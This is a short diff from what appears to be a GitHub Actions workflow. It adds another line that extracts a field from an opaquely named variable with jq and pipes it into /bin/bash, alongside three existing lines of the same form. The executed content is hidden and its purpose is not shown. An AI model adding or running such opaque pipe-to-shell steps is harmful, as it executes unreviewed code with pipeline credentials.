@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$kjae50559" | jq -r .tb4 | /bin/bash
           printf '%s' "$edd5" | jq -r .t5306 | /bin/bash
           echo $brm1615 | jq -r .b3 | /bin/bash
+          printf '%s' "$u6862" | jq -r .xp2 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
